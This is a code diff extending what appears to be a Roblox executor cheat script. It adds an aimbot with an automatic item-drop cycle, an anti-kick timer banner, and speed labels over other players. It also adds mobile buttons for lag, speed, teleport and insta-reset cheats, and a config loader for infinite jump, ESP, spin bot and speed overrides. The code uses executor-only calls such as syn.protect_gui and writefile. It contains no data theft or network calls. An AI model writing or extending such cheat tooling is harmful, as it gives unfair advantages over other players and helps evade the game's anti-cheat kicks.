+    local CARRY_DROP_AIM_ANIM_ID = "71186871415348"
+    local carryDropAimWasPlaying = false
+    local carryDropAimLastTrigger = 0
+    local carryDropAimSequenceActive = false
+
+    local function isCarryDropAimAnimationPlaying()
+        local character = LP.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
+        if not animator then return false end
+        for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+            local animation = track.Animation
+            local animationId = animation and animation.AnimationId or ""
+            if string.find(animationId, CARRY_DROP_AIM_ANIM_ID, 1, true) then return true end
+        end
+        return false
+    end
+
+    _G.PureCursedDropAimCarryAnimationPlaying = isCarryDropAimAnimationPlaying
+
+    local function isPureAimButtonActive()
+        if not __HH.batV2Enabled then return false end
+        local getter = _G.PureCursedGetAimbot
+        if type(getter) ~= "function" then return false end
+        local ok, enabled = pcall(getter)
+        return ok and enabled == true
+    end
+
+    -- Ragdoll destroys the carry animation PERMANENTLY: after a ragdoll ends
+    -- (~3 seconds) the carry anim id does NOT come back, so the drop must
+    -- never fire again for that brainrot. AntiRagdoll and the always-on speed
+    -- loop both stamp _G.PureRagdollKilledCarry = true the moment ragdoll is
+    -- detected (even while AIM BOT is off). The flag only resets when a
+    -- brand-new carry animation starts (fresh pickup), via rising edge below.
+    local function recentlyRagdolled()
+        return _G.PureRagdollKilledCarry == true
+    end
+
+    local function stopCarryAnimNow()
+        local character = LP.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local animator = humanoid and humanoid:FindFirstChildOfClass("Animator")
+        if not animator then return end
+        for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+            local animation = track.Animation
+            local animationId = animation and animation.AnimationId or ""
+            if string.find(animationId, CARRY_DROP_AIM_ANIM_ID, 1, true) then
+                track:Stop(0)
+            end
+        end
+    end
+
+    local DROP_CONFIRM_STABLE_HEARTBEATS = 3
+    local DROP_RETRY_INTERVAL = 0.75
+
+    local function hasDetectedCarryState()
+        local ok, carrying = pcall(__HH.isCarryingBrainrot, LP.Character)
+        return ok and carrying == true
+    end
+
+    local function restorePureAimAfterConfirmedDrop(requireCarryStateClear)
+        task.spawn(function()
+            local stableClearHeartbeats = 0
+            local lastDropAttemptAt = tick()
+            while carryDropAimSequenceActive do
+                RunService.Heartbeat:Wait()
+
+                local dropMotionFinished = __HH.dropActive ~= true
+                local carryAnimationCleared = not isCarryDropAimAnimationPlaying()
+                local carryStateCleared = not requireCarryStateClear or not hasDetectedCarryState()
+
+                if dropMotionFinished and carryAnimationCleared and carryStateCleared then
+                    stableClearHeartbeats = stableClearHeartbeats + 1
+                else
+                    stableClearHeartbeats = 0
+                end
+
+                if stableClearHeartbeats >= DROP_CONFIRM_STABLE_HEARTBEATS then
+                    -- Confirmed drop: finish the handoff and re-enable AIM BOT
+                    -- automatically, mirroring the same enable path used by the
+                    -- normal BAT V2 toggle (backend + visual + mobile button).
+                    _G.PureDropThenAimSafeModeAuthorized = false
+                    __HH.batV2Enabled = true
+                    if _G.PureCursedSetAimbot then pcall(_G.PureCursedSetAimbot, true) end
+                    if __HH.batV2SetVisual then __HH.batV2SetVisual(true) end
+                    if __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(true) end
+                    carryDropAimSequenceActive = false
+                    _G.PureDropThenAimCycleActive = false
+                    saveConfig()
+                    return
+                end
+
+                -- Failed/not-yet-confirmed drop: keep AIM BOT OFF and retry DROP BR.
+                -- Never retry on top of an active drop movement.
+                local now = tick()
+                if __HH.dropActive ~= true and now - lastDropAttemptAt >= DROP_RETRY_INTERVAL then
+                    lastDropAttemptAt = now
+                    runDrop()
+                end
+            end
+        end)
+    end
+
+    local function triggerPureDropAimCycle()
+        local now = tick()
+        if carryDropAimSequenceActive then return end
+        if now - carryDropAimLastTrigger < 0.75 then return end
+        carryDropAimLastTrigger = now
+        carryDropAimSequenceActive = true
+        antiKickAimPending = false
+        _G.PureDropThenAimCycleActive = true
+        _G.PureDropThenAimSafeModeAuthorized = false
+
+        -- Stop the backend and synchronize both Aim Bot controls before DROP BR.
+        __HH.batV2Enabled = false
+        if _G.PureCursedSetAimbot then pcall(_G.PureCursedSetAimbot, false) end
+        if __HH.batV2SetVisual then __HH.batV2SetVisual(false) end
+        if __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(false) end
+
+        -- If a concrete carry state exists now, require that exact condition to
+        -- clear too; otherwise the known carry animation is the confirmation signal.
+        local requireCarryStateClear = hasDetectedCarryState()
+        runDrop()
+        restorePureAimAfterConfirmedDrop(requireCarryStateClear)
+    end
+
+    local carryAnimPrev = false
+
+    RunService.Heartbeat:Connect(function()
+        if carryDropAimSequenceActive then
+            carryDropAimWasPlaying = isCarryDropAimAnimationPlaying()
+            carryAnimPrev = carryDropAimWasPlaying
+            return
+        end
+
+        local isPlaying = isCarryDropAimAnimationPlaying()
+
+        -- Always-on rising edge: a brand-new carry animation just started
+        -- (fresh brainrot pickup). This is the only thing that re-arms the
+        -- drop after a ragdoll permanently destroyed the previous carry.
+        if isPlaying and not carryAnimPrev then
+            _G.PureRagdollKilledCarry = false
+        end
+        carryAnimPrev = isPlaying
+
+        if not isPureAimButtonActive() then
+            carryDropAimWasPlaying = false
+            return
+        end
+
+        if recentlyRagdolled() then
+            -- A ragdoll destroyed this carry for good (the anim id never comes
+            -- back), so never drop it: just stop the anim and let AIM BOT run
+            -- with no drop movement.
+            stopCarryAnimNow()
+            carryDropAimWasPlaying = false
+            return
+        end
+
+        if isPlaying and not carryDropAimWasPlaying then triggerPureDropAimCycle() end
+        carryDropAimWasPlaying = isPlaying
+    end)
+end
+
+-- Anti Kick E01 carry timer (top-screen wide banner, very light blue).
+do
+    local e01Gui, e01Lbl, e01Active = nil, nil, false
+    local E01_ANIM = "71186871415348"
+    local function e01InCarry()
+        local char=LP.Character; local hum=char and char:FindFirstChildOfClass("Humanoid"); local animator=hum and hum:FindFirstChildOfClass("Animator")
+        if not animator then return false end
+        for _,track in ipairs(animator:GetPlayingAnimationTracks()) do if track.Animation.AnimationId:find(E01_ANIM) then return true end end
+        return false
+    end
+    local function clearE01()
+        e01Active=false
+        if e01Gui then e01Gui:Destroy(); e01Gui=nil end
+        e01Lbl=nil
+    end
+    local function showE01()
+        if e01Active then return end
+        e01Active=true
+        e01Gui=Instance.new("ScreenGui")
+        e01Gui.Name="AntiKickE01"; e01Gui.ResetOnSpawn=false; e01Gui.IgnoreGuiInset=true
+        e01Gui.ZIndexBehavior=Enum.ZIndexBehavior.Sibling; e01Gui.DisplayOrder=15
+        pcall(function() if syn and syn.protect_gui then syn.protect_gui(e01Gui) end end)
+        if not pcall(function() e01Gui.Parent=game:GetService("CoreGui") end) then
+            e01Gui.Parent=LP:WaitForChild("PlayerGui")
+        end
+        local bar=Instance.new("Frame",e01Gui)
+        bar.AnchorPoint=Vector2.new(0.5,0)
+        bar.Size=UDim2.new(1,-40,0,50); bar.Position=UDim2.new(0.5,0,0,70)
+        bar.BackgroundColor3=Color3.fromRGB(4,16,32); bar.BackgroundTransparency=.5; bar.BorderSizePixel=0
+        Instance.new("UICorner",bar).CornerRadius=UDim.new(0,10)
+        local stroke=Instance.new("UIStroke",bar); stroke.Color=Color3.fromRGB(200,242,255); stroke.Thickness=1.5; stroke.Transparency=.3
+        e01Lbl=Instance.new("TextLabel",bar)
+        e01Lbl.Size=UDim2.new(1,-8,1,0); e01Lbl.Position=UDim2.new(0,4,0,0)
+        e01Lbl.BackgroundTransparency=1; e01Lbl.Text="DON'T WIN OR E01"
+        e01Lbl.Font=Enum.Font.GothamBlack; e01Lbl.TextSize=24
+        e01Lbl.TextColor3=Color3.fromRGB(190,232,255); e01Lbl.ZIndex=5
+        local began=tick()
+        task.spawn(function()
+            while e01Active do
+                task.wait(.05)
+                if not e01InCarry() then clearE01(); return end
+                local left=math.max(0,3.1-(tick()-began))
+                if left<=0 then clearE01(); return end
+                if left < 1 then
+                    e01Lbl.Text = "YOU CAN WIN"
+                    e01Lbl.TextSize = 28
+                    e01Lbl.TextColor3 = Color3.fromRGB(215,247,255)
+                else
+                    e01Lbl.Text = "DON'T WIN OR E01"
+                    e01Lbl.TextSize = 24
+                    e01Lbl.TextColor3 = Color3.fromRGB(190,232,255)
+                end
+            end
+        end)
+    end
+    task.spawn(function() local was=false; while task.wait(.12) do local now=e01InCarry(); if now and not was then showE01() elseif not now and was then clearE01() end; was=now end end)
+end
+
+local playerSpeedLabels = {}
+
+local function createPlayerSpeedLabel(plr)
+    if plr == LP then return end
+    local char = plr.Character
+    if not char then return end
+    local head = char:FindFirstChild("Head")
+    if not head then return end
+
+    if playerSpeedLabels[plr] then
+        playerSpeedLabels[plr].gui:Destroy()
+        playerSpeedLabels[plr] = nil
+    end
+
+    local speedGui = Instance.new("BillboardGui")
+    speedGui.Name = "VynxSpeedLabel_Other"
+    speedGui.Adornee = head
+    speedGui.Size = UDim2.new(0, 160, 0, 28)
+    speedGui.StudsOffset = Vector3.new(0, 2.8, 0)
+    speedGui.AlwaysOnTop = true
+    speedGui.Parent = char
+
+    local speedLbl = Instance.new("TextLabel")
+    speedLbl.Size = UDim2.new(1,0,1,0)
+    speedLbl.BackgroundTransparency = 1
+    speedLbl.Text = "Speed: 0"
+    speedLbl.TextColor3 = Color3.fromRGB(205, 232, 255)
+    speedLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    speedLbl.TextStrokeTransparency = 0
+    speedLbl.Font = Enum.Font.GothamBold
+    speedLbl.TextSize = 14
+    speedLbl.TextScaled = true
+    speedLbl.TextXAlignment = Enum.TextXAlignment.Center
+    speedLbl.Parent = speedGui
+
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        if not char or not char.Parent then
+            conn:Disconnect()
+            return
+        end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        local spd = hum and hum.WalkSpeed or 0
+        speedLbl.Text = string.format("Speed: %.0f", spd)
+    end)
+
+    playerSpeedLabels[plr] = {gui = speedGui, lbl = speedLbl, conn = conn}
+end
+
+Players.PlayerAdded:Connect(function(plr)
+    if plr ~= LP then
+        plr.CharacterAdded:Connect(function()
+            task.wait(0.5)
+            createPlayerSpeedLabel(plr)
+        end)
+    end
+end)
+
+Players.PlayerRemoving:Connect(function(plr)
+    if playerSpeedLabels[plr] then
+        playerSpeedLabels[plr].gui:Destroy()
+        if playerSpeedLabels[plr].conn then playerSpeedLabels[plr].conn:Disconnect() end
+        playerSpeedLabels[plr] = nil
+    end
+end)
+
+local _cachedChar, _cachedHum, _cachedHrp = nil, nil, nil
+
+LP.CharacterAdded:Connect(function(char)
+    _cachedChar = nil; _cachedHum = nil; _cachedHrp = nil
+    task.wait(0.3)
+    _cachedChar = char
+    _cachedHum = char:FindFirstChildOfClass("Humanoid")
+    _cachedHrp = char:FindFirstChild("HumanoidRootPart")
+    if _G.PureSpinBot and _G.PureSpinBot.enabled and _G.PureSpinBot.restart then
+        _G.PureSpinBot.restart()
+    end
+    if __HH.medusaCounterEnabled or __HH.medusaResetEnabled then setupMedusa(char) end
+    if __HH.batCounterEnabled then startBatCounter() end
+    if __HH.unwalkEnabled then task.wait(0.5); __HH.startUnwalk() end
+    if __HH.aceSelectedAnimationPack ~= "OFF" then
+        task.wait(0.15)
+        __HH.aceOriginalAnims = {}
+        pcall(function() __HH.aceApplyAnimationPack(__HH.aceSelectedAnimationPack) end)
+    end
+    if __HH.antiRagdollEnabled then __HH.stopAntiRagdoll(); __HH.startAntiRagdoll() end
+    __HH.startAntiDie()
+    if __HH.autoResetOnDeath then __HH.setupDeathReset() end
+    if __HH.tpLockEnabled then
+        task.delay(0.2, function()
+            if __HH.tpLockEnabled and startTPLock then startTPLock() end
+        end)
+    end
+end)
+
+__HH.UIS.InputBegan:Connect(function(input, gpe)
+    if __HH._anyKeyListening then return end
+    if input.UserInputType == Enum.UserInputType.Keyboard then
+        if gpe or __HH.UIS:GetFocusedTextBox() then return end
+    end
+    if not __HH.isGamepadInput(input) then
+        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
+    end
+    if not __HH.isBindableInput(input) then return end
+    local kc = input.KeyCode
+    if __HH.kbMatch(__HH.KB.LaggerToggle, kc) then toggleLaggerMode(); saveConfig()
+    elseif __HH.kbMatch(__HH.KB.SpeedToggle, kc) then toggleCarryMode(); saveConfig()
+    elseif __HH.kbMatch(__HH.KB.DropBrainrot, kc) then runDrop()
+    elseif __HH.kbMatch(__HH.KB.InstaReset, kc) then
+        if tick() - __HH._lastKbSet > 0.5 then pcall(__HH.FrameReset.ResetPlayer) end
+    elseif __HH.kbMatch(__HH.KB.TPFloor, kc) then __HH.tpToGround()
+    elseif __HH.kbMatch(__HH.KB.AutoLeft, kc) then
+        toggleAutoLeft()
+    elseif __HH.kbMatch(__HH.KB.AutoRight, kc) then
+        toggleAutoRight()
+    elseif __HH.kbMatch(__HH.KB.TPLock, kc) then
+        if __HH.batV2Enabled then toggleBatV2() end
+        toggleTPLock(); saveConfig()
+    elseif __HH.kbMatch(__HH.KB.GuiHide, kc) then
+        if __HH.mainFrame then __HH.mainFrame.Visible = not __HH.mainFrame.Visible end
+    elseif __HH.kbMatch(__HH.KB.BatV2Toggle, kc) then
+        if not __HH.batV2Enabled and _G.AceSafeModeTryStart
+            and not _G.AceSafeModeTryStart(false) then return end
+        if __HH.tpLockEnabled then toggleTPLock() end
+        toggleBatV2(); saveConfig()
+    end
+end)
+
+local MOB_POS_FILE = "vynx_btnpos.json"
+local DRAG_THRESHOLD = 15
+
+local function loadBtnPositions()
+    if not (isfile and isfile(MOB_POS_FILE)) then return {} end
+    local ok, data = pcall(function() return __HH.HS:JSONDecode(readfile(MOB_POS_FILE)) end)
+    if ok and type(data) == "table" then return data end
+    return {}
+end
+
+local function saveBtnPositions()
+    if not writefile then return end; if not __HH.mobGuiRef then return end
+    local out = {}
+    for _, child in ipairs(__HH.mobGuiRef:GetDescendants()) do
+        if child:IsA("Frame") and child:GetAttribute("BtnKey") then
+            local key = child:GetAttribute("BtnKey")
+            out[key] = {xo = child.Position.X.Offset, yo = child.Position.Y.Offset}
+        end
+    end
+    pcall(function() writefile(MOB_POS_FILE, __HH.HS:JSONEncode(out)) end)
+end
+
+local function destroyMobileButtons()
+    if __HH.mobGuiRef then pcall(function() __HH.mobGuiRef:Destroy() end); __HH.mobGuiRef = nil end
+    __HH.mobBtnRefs = {}
+end
+
+local function resetBtnPositions()
+    pcall(function() if writefile then writefile(MOB_POS_FILE, "{}") end end)
+    if __HH.mobileButtonsEnabled then buildMobileButtons() end
+end
+
+local function buildMobileButtons()
+    destroyMobileButtons()
+    if not __HH.mobileButtonsEnabled then return end
+    local savedPositions = loadBtnPositions()
+    local BTN_SIZE = math.floor(__HH.mobileButtonsSize * 0.65)
+    local fontSize = math.max(9, math.floor(__HH.mobileButtonsSize * 0.13))
+    local spacing = 20; local cols = 2
+    local isRect = __HH.rectangularButtonsEnabled
+    local btnW = BTN_SIZE; local btnH = BTN_SIZE
+    if isRect then btnW = math.floor(BTN_SIZE*1.4); btnH = math.floor(BTN_SIZE*0.75); spacing = 16 end
+    local viewport = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(800,600)
+    local totalW = cols * btnW + (cols-1) * spacing
+    local startX = viewport.X - totalW - 30; local startY = 30
+    local buttonOrder = {
+        {key="drop",         label="DROP BR",         toggle=false},
+        {key="tpDown",       label="TP DOWN",         toggle=false},
+        {key="batV2",        label="AIM BOT",          toggle=true},
+        {key="tpLock",       label="TP BAT",     toggle=true},
+        {key="lagger",       label="LAGGER",          toggle=true},
+        {key="laggerCarry",  label="LAGGER CARRY",    toggle=true},
+        {key="carrySpeed",   label="CARRY SPEED",     toggle=true},
+        {key="instaReset",   label="INSTA RESET",     toggle=false},
+        {key="autoLeft",     label="AUTO LEFT",       toggle=true},
+        {key="autoRight",    label="AUTO RIGHT",      toggle=true},
+    }
+    local mobGui = Instance.new("ScreenGui")
+    mobGui.Name = "VynxMobileButtons"; mobGui.ResetOnSpawn = false
+    mobGui.DisplayOrder = 15; mobGui.IgnoreGuiInset = true
+    pcall(function() if syn and syn.protect_gui then syn.protect_gui(mobGui) end end)
+    if not pcall(function() mobGui.Parent = game:GetService("CoreGui") end) then
+        mobGui.Parent = LP:WaitForChild("PlayerGui")
+    end
+    __HH.mobGuiRef = mobGui
+
+    -- only render buttons that are visible
+    local visibleOrder = {}
+    for _, def in ipairs(buttonOrder) do
+        if __HH.buttonVisibility[def.key] ~= false then
+            visibleOrder[#visibleOrder+1] = def
+        end
+    end
+    for i, def in ipairs(visibleOrder) do
+        local col = (i-1) % cols; local row = math.floor((i-1)/cols)
+        local xPos = startX + col*(btnW+spacing); local yPos = startY + row*(btnH+spacing)
+        local saved = savedPositions[def.key]
+        local initX = saved and saved.xo or xPos; local initY = saved and saved.yo or yPos
+        local frame = Instance.new("Frame", mobGui)
+        frame.Name = "MobBtn_"..def.key
+        frame.Size = UDim2.new(0,btnW,0,btnH)
+        frame.Position = UDim2.new(0,initX,0,initY)
+        frame.BackgroundColor3 = __HH.BTN_OFF; frame.BackgroundTransparency = 0
+        frame.BorderSizePixel = 0; frame.Active = true; frame.ZIndex = 102
+        frame:SetAttribute("BtnKey", def.key)
+        local cornerRadius
+        if __HH.circleButtonsEnabled then cornerRadius = UDim.new(1,0)
+        elseif __HH.shapeButtonsEnabled then cornerRadius = UDim.new(0,4)
+        elseif __HH.rectangularButtonsEnabled then cornerRadius = UDim.new(0,9)
+        else cornerRadius = UDim.new(0, math.max(8, math.floor(math.min(btnW,btnH)*0.2))) end
+        local uic = Instance.new("UICorner", frame); uic.CornerRadius = cornerRadius
+
+        local fstroke = Instance.new("UIStroke", frame)
+        fstroke.Color = Color3.fromRGB(80,80,80); fstroke.Thickness = 1.5
+        fstroke.Transparency = 1
+
+        local btn = Instance.new("TextButton", frame)
+        btn.Size = UDim2.new(1,0,1,0); btn.BackgroundTransparency = 1
+        btn.Text = def.label; btn.TextColor3 = __HH.TEXT_OFF
+        btn.Font = Enum.Font.GothamBold; btn.TextSize = fontSize
+        btn.LineHeight = 1.1; btn.TextWrapped = true
+        btn.AutoButtonColor = false; btn.ZIndex = 105
+        local isOn = false
+        local function setOn(v)
+            isOn = v
+            if v then
+                frame:SetAttribute("BtnIsOn", true)
+                local color = (def.key == "carrySpeed") and Color3.fromRGB(255, 105, 115) or __HH.BTN_ON
+                TS:Create(frame, TweenInfo.new(0.12,Enum.EasingStyle.Quad), {BackgroundColor3 = color}):Play()
+                TS:Create(fstroke, TweenInfo.new(0.12), {Color=Color3.fromRGB(80,80,80), Thickness=2.5, Transparency=0}):Play()
+                TS:Create(btn, TweenInfo.new(0.12), {TextColor3 = __HH.TEXT_ON}):Play()
+            else
+                frame:SetAttribute("BtnIsOn", false)
+                TS:Create(frame, TweenInfo.new(0.12,Enum.EasingStyle.Quad), {BackgroundColor3 = __HH.BTN_OFF}):Play()
+                TS:Create(fstroke, TweenInfo.new(0.12), {Color=Color3.fromRGB(80,80,80), Thickness=1.5, Transparency=1}):Play()
+                TS:Create(btn, TweenInfo.new(0.12), {TextColor3 = __HH.TEXT_OFF}):Play()
+            end
+        end
+        __HH.mobBtnRefs[def.key] = setOn
+        local dragData = {start=nil,startPos=nil,moved=false,down=false}
+        btn.InputBegan:Connect(function(input)
+            if __HH.uiLocked or not __HH.perButtonDragEnabled then return end
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragData.moved=false; dragData.down=true
+                dragData.start=input.Position; dragData.startPos=frame.Position
+                input.Changed:Connect(function()
+                    if input.UserInputState == Enum.UserInputState.End then
+                        dragData.down=false
+                        if dragData.moved then pcall(saveBtnPositions) end
+                    end
+                end)
+            end
+        end)
+        btn.InputChanged:Connect(function(input)
+            if dragData.down and not __HH.uiLocked and __HH.perButtonDragEnabled and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+                local delta = input.Position - dragData.start
+                if delta.Magnitude > DRAG_THRESHOLD then dragData.moved = true end
+                if dragData.moved then
+                    frame.Position = UDim2.new(dragData.startPos.X.Scale, dragData.startPos.X.Offset+delta.X, dragData.startPos.Y.Scale, dragData.startPos.Y.Offset+delta.Y)
+                end
+            end
+        end)
+        local function flashWhite()
+            TS:Create(frame, TweenInfo.new(0.06), {BackgroundColor3=Color3.fromRGB(160, 215, 255)}):Play()
+            TS:Create(btn, TweenInfo.new(0.06), {TextColor3=Color3.fromRGB(205,232,255)}):Play()
+            task.delay(0.15, function()
+                if isOn then
+                    local color = (def.key == "carrySpeed") and Color3.fromRGB(255, 105, 115) or __HH.BTN_ON
+                    TS:Create(frame, TweenInfo.new(0.12), {BackgroundColor3=color}):Play()
+                    TS:Create(btn, TweenInfo.new(0.12), {TextColor3=__HH.TEXT_ON}):Play()
+                else
+                    TS:Create(frame, TweenInfo.new(0.12), {BackgroundColor3=__HH.BTN_OFF}):Play()
+                    TS:Create(btn, TweenInfo.new(0.12), {TextColor3=__HH.TEXT_OFF}):Play()
+                end
+            end)
+        end
+        btn.MouseButton1Click:Connect(function()
+            if dragData.moved then dragData.moved=false; return end
+            flashWhite()
+            if def.key == "tpLock" then
+                if __HH.batV2Enabled then toggleBatV2() end
+                toggleTPLock(); setOn(__HH.tpLockEnabled); saveConfig(); return
+            end
+            if def.key == "batV2" then
+                if not __HH.batV2Enabled and _G.AceSafeModeTryStart
+                    and not _G.AceSafeModeTryStart(true) then
+                    setOn(false); saveConfig(); return
+                end
+                if __HH.tpLockEnabled then toggleTPLock() end
+                toggleBatV2(); setOn(__HH.batV2Enabled)
+                saveConfig(); return
+            end
+            if def.key == "carrySpeed" then
+                toggleCarryMode(); setOn(carrySpeedActive)
+                if __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
+                if __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
+                saveConfig(); return
+            end
+            if def.key == "lagger" then
+                toggleLaggerMode(); setOn(laggerModeEnabled)
+                if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
+                if __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
+                saveConfig(); return
+            end
+            if def.key == "laggerCarry" then
+                toggleLaggerCarryMode(); setOn(laggerCarryToggled)
+                if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
+                if __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
+                saveConfig(); return
+            end
+            if def.key == "drop" then runDrop(); return end
+            if def.key == "tpDown" then __HH.tpToGround(); return end
+            if def.key == "instaReset" then __HH.FrameReset.ResetPlayer(); return end
+            if def.key == "autoLeft" then toggleAutoLeft(); return end
+            if def.key == "autoRight" then toggleAutoRight(); return end
+        end)
+    end
+    
+    if __HH.mobBtnRefs.tpLock then __HH.mobBtnRefs.tpLock(__HH.tpLockEnabled) end
+    if __HH.mobBtnRefs.autoLeft then __HH.mobBtnRefs.autoLeft(autoLeftEnabled) end
+    if __HH.mobBtnRefs.autoRight then __HH.mobBtnRefs.autoRight(autoRightEnabled) end
+    if __HH.mobBtnRefs.batV2 then __HH.mobBtnRefs.batV2(__HH.batV2Enabled) end
+    if __HH.mobBtnRefs.carrySpeed then __HH.mobBtnRefs.carrySpeed(carrySpeedActive) end
+    if __HH.mobBtnRefs.lagger then __HH.mobBtnRefs.lagger(laggerModeEnabled) end
+    if __HH.mobBtnRefs.laggerCarry then __HH.mobBtnRefs.laggerCarry(laggerCarryToggled) end
+end
+
+-- loadConfig(externalCfg) applies a settings table either read from disk or
+-- passed in directly (used by "Load Config" to restore a pasted code).
+-- On a brand-new install (no VynxPC.json yet, or a corrupt one) it writes an
+-- initial config immediately so auto-save is active from the very first run
+-- instead of waiting for the user to change a setting first.
+loadConfig = function(externalCfg)
+    local cfg = externalCfg
+    if not cfg then
+        if not (isfile and isfile("VynxPC.json")) then
+            saveConfig()
+            return
+        end
+        local ok, decoded = pcall(function() return __HH.HS:JSONDecode(readfile("VynxPC.json")) end)
+        if not ok or type(decoded) ~= "table" then
+            saveConfig()
+            return
+        end
+        cfg = decoded
+    end
+    if cfg.normalSpeed then NS = cfg.normalSpeed end
+    if cfg.carrySpeed then CS = cfg.carrySpeed end
+    if cfg.laggerSpeed then LAGGER_SPEED = cfg.laggerSpeed end
+    if cfg.laggerCarrySpeed then LAGGER_CARRY_SPEED = cfg.laggerCarrySpeed end
+    if cfg.aimbotV1Speed then aimbotV1Speed = cfg.aimbotV1Speed end
+    if cfg.autoCarrySpeedEnabled ~= nil then autoCarrySpeedEnabled = cfg.autoCarrySpeedEnabled end
+    if _G.Round3SpeedBooster then
+        if cfg.r3Enabled ~= nil then
+            _G.Round3SpeedBooster.setEnabled(cfg.r3Enabled == true)
+        end
+        if cfg.r3NormalSpeed then _G.Round3SpeedBooster.setNormalSpeed(cfg.r3NormalSpeed) end
+        if cfg.r3CarrySpeed then _G.Round3SpeedBooster.setCarrySpeed(cfg.r3CarrySpeed) end
+        if cfg.r3ForceCarry ~= nil and _G.Round3SpeedBooster.setForceCarry then
+            _G.Round3SpeedBooster.setForceCarry(cfg.r3ForceCarry == true)
+        end
+    end
+    if cfg.autoTPHeight then __HH.autoTPHeight = cfg.autoTPHeight end
+    if cfg.autoJumpBrainrot ~= nil then __HH.autoJumpBrainrot = cfg.autoJumpBrainrot end
+    if cfg.floatHeight then __HH.floatHeight = math.clamp(tonumber(cfg.floatHeight) or 6, 0, 200) end
+    if cfg.floatEnabled ~= nil then __HH.floatEnabled = cfg.floatEnabled end
+    if cfg.mobileButtonsSize then __HH.mobileButtonsSize = cfg.mobileButtonsSize end
+    if cfg.antiRagdoll ~= nil then __HH.antiRagdollEnabled = cfg.antiRagdoll end
+    if cfg.infiniteJump ~= nil then __HH.infJumpEnabled = cfg.infiniteJump end
+    if cfg.medusaCounter ~= nil then __HH.medusaCounterEnabled = cfg.medusaCounter end
+    if cfg.medusaReset ~= nil then __HH.medusaResetEnabled = cfg.medusaReset end
+    if cfg.batCounter ~= nil then __HH.batCounterEnabled = cfg.batCounter end
+    if cfg.carryMode ~= nil then carrySpeedActive = cfg.carryMode; speedMode = cfg.carryMode end
+    if cfg.laggerMode ~= nil then laggerModeEnabled = cfg.laggerMode end
+    if cfg.laggerCarryMode ~= nil then laggerCarryToggled = cfg.laggerCarryMode end
+    if cfg.tpLockEnabled ~= nil then __HH.tpLockEnabled = cfg.tpLockEnabled end
+    if cfg.autoSwing ~= nil then autoSwingEnabled = cfg.autoSwing end
+    if cfg.mirrorTPDownEnabled ~= nil and _G.PureMirrorTPDown
+    and _G.PureMirrorTPDown.setEnabled then
+        _G.PureMirrorTPDown.setEnabled(cfg.mirrorTPDownEnabled)
+    end
+    if _G.PureBatSpam and cfg.batSpamEnabled ~= nil
+    and _G.PureBatSpam.setEnabled then
+        _G.PureBatSpam.setEnabled(cfg.batSpamEnabled)
+    end
+    if cfg.spinBotEnabled ~= nil and _G.PureSpinBot then _G.PureSpinBot.enabled = cfg.spinBotEnabled end
+    if cfg.unwalkEnabled ~= nil then __HH.unwalkEnabled = cfg.unwalkEnabled end
+    if cfg.antiLag ~= nil then __HH.antiLagEnabled = cfg.antiLag end
+    if cfg.stretchRez ~= nil then __HH.stretchRezEnabled = cfg.stretchRez end
+    if cfg.autoTPEnabled ~= nil then __HH.autoTPEnabled = cfg.autoTPEnabled end
+    if cfg.guiTransparencyEnabled ~= nil then __HH.guiTransparencyEnabled = cfg.guiTransparencyEnabled end
+    if cfg.mobileButtonsEnabled ~= nil then __HH.mobileButtonsEnabled = cfg.mobileButtonsEnabled end
+    if cfg.circleButtonsEnabled ~= nil then __HH.circleButtonsEnabled = cfg.circleButtonsEnabled end
+    if cfg.shapeButtonsEnabled ~= nil then __HH.shapeButtonsEnabled = cfg.shapeButtonsEnabled end
+    if cfg.rectangularButtonsEnabled ~= nil then __HH.rectangularButtonsEnabled = cfg.rectangularButtonsEnabled end
+    if cfg.antiDie ~= nil then __HH.antiDieEnabled = cfg.antiDie end
+    if cfg.autoResetOnDeath ~= nil then __HH.autoResetOnDeath = cfg.autoResetOnDeath end
+    if cfg.infJumpMode ~= nil then __HH.infJumpMode = cfg.infJumpMode end
+    if cfg.uiLocked ~= nil then __HH.uiLocked = cfg.uiLocked end
+    _G.YousefUiLocked = __HH.uiLocked
+    if cfg.perButtonDragEnabled ~= nil then __HH.perButtonDragEnabled = cfg.perButtonDragEnabled end
+    if cfg.batV2Enabled ~= nil then __HH.batV2Enabled = cfg.batV2Enabled end
+    if cfg.batAimMode == "normal" or cfg.batAimMode == "bypass" then
+        batAimMode = cfg.batAimMode
+    elseif cfg.batAimMode == "v1" or cfg.batAimMode == "v2" then
+        batAimMode = "normal"
+    end
+    if cfg.skyTheme ~= nil then __HH.currentSkyTheme = cfg.skyTheme end
+    if cfg.uiScale ~= nil then uiScaleValue = cfg.uiScale end
+        if cfg.espEnabled ~= nil then __HH.espEnabled = cfg.espEnabled end
+    if type(cfg.headlessEnabled) == "boolean" then __HH.headlessEnabled = cfg.headlessEnabled end
+    if type(cfg.korbloxEnabled) == "boolean" then __HH.korbloxEnabled = cfg.korbloxEnabled end
+    if type(cfg.accessoryPack) == "string" then currentAccessoryPack = cfg.accessoryPack end
+    if cfg.autoLeftEnabled ~= nil then autoLeftEnabled = cfg.autoLeftEnabled end
+    if cfg.autoRightEnabled ~= nil then autoRightEnabled = cfg.autoRightEnabled end
